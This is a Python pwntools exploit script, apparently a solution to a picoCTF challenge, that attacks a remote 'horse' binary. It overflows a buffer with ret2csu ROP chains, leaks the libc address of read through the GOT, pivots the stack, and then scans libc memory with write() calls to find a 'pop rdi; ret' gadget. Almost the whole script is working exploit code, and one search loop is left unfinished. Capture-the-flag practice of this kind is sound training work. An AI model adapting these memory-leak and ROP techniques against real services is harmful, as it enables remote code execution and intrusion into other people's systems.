from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
leave_ret = 0x400b96 

def leak_read():
    heap_stack = 0x602500
    payload = b'A' * 32
    payload += b'B' * 8 
    
    # Chain 1: Write got_read
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Chain 2: Read(0, heap_stack, 0x8000) - Large read
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_read) + p64(0) + p64(heap_stack) + p64(0x8000)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Chain 3: Pivot
    payload += p64(csu_pop)
    payload += p64(0) + p64(heap_stack) + p64(0) * 4 + p64(leave_ret) 

    log.info("Sending Chain payload...")
    r.sendline(payload)
    
    r.recvuntil(b'/     /   \xc2\xb4\n')
    
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        log.success(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except Exception as e:
        log.error(f"Failed to receive leak: {e}")
        exit()

leaked_read = leak_read()

# Stage 2: Scan
# Generate ret2csu calls to write(1, addr, 2)
# Address range
# 0ubuntu9 pop rdi offset relative to read: 0x26b72 - 0x110fa0 = -0xea42e
# 9.2 pop rdi offset relative to read: 0x26b72 - 0x111130 = -0xea5be
# 9.18 pop rdi offset relative to read: 0x23b6a - 0x10e1e0 = -0xea676

# Search range centered around -0xea5be
center_offset = -0xea5be
start_offset = center_offset - 0x400
end_offset = center_offset + 0x400

# Step 1 byte
addresses = range(leaked_read + start_offset, leaked_read + end_offset)

payload2 = b'J' * 8 

# Construct chain
count = 0
for addr in addresses:
    # write(1, addr, 2) using ret2csu
    # We use csu_pop -> csu_call -> csu_pop...
    # csu_call returns to csu_pop (via fallthrough to add rsp,8; pop...)
    # So we just need to pack rbx, rbp, r12, r13, r14, r15 for EACH call.
    
    # rbx=0, rbp=1, r12=got_write, r13=1(rdi), r14=addr(rsi), r15=2(rdx)
    payload2 += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(addr) + p64(2)
    payload2 += p64(csu_call)
    payload2 += b'J' * 8 # add rsp, 8
    count += 1
    if len(payload2) > 0x7000: # limit size
        break

log.info(f"Scanning {count} addresses...")
r.sendline(payload2)

# Receive and check
# output stream
data = r.recvn(count * 2)
# find 5f c3
for i in range(len(data) - 1):
    if data[i] == 0x5f and data[i+1] == 0xc3:
        # Found at index i
        # index corresponds to addresses[i/2] ? No, data is contiguous bytes.
        # We read 2 bytes for each address.
        # Address K gives data[2*K] and data[2*K+1].
        # But we scan address K, K+1, K+2...
        # Address K: gives byte at K, K+1.
        # Address K+1: gives byte at K+1, K+2.
        # If we find 5f c3 at data index P.
        # data[P] == 5f.
        # data[P] comes from write call corresponding to...
        # Wait, we receive 2 bytes per call.
        # Call 0: reads addr, addr+1.
        # Call 1: reads addr+1, addr+2.
        # If Call 0 returns 5f c3. Then addr has 5f, addr+1 has c3.
        # If Call 0 returns X 5f. Call 1 returns 5f c3.
        # Then addr+1 has 5f, addr+2 has c3.
        
        # We check for 5f c3 in a 2-byte chunk?
        # Or reconstruct memory?
        pass

# Reconstruct memory
memory = {}
for k in range(count):
    addr = addresses[k]
    b1 = data[2*k]
    b2 = data[2*k+1]
    memory[addr] = b1
    memory[addr+1] = b2

# Search in memory
found_rdi = None
sorted_addrs = sorted(memory.keys())
for addr in sorted_addrs:
    if memory.get(addr) == 0x5f and memory.get(addr+1) == 0xc3:
        log.success(f"Found pop rdi; ret at {hex(addr)}")
        found_rdi = addr
        break

if not found_rdi:
    log.error("pop rdi not found in range")

r.close()
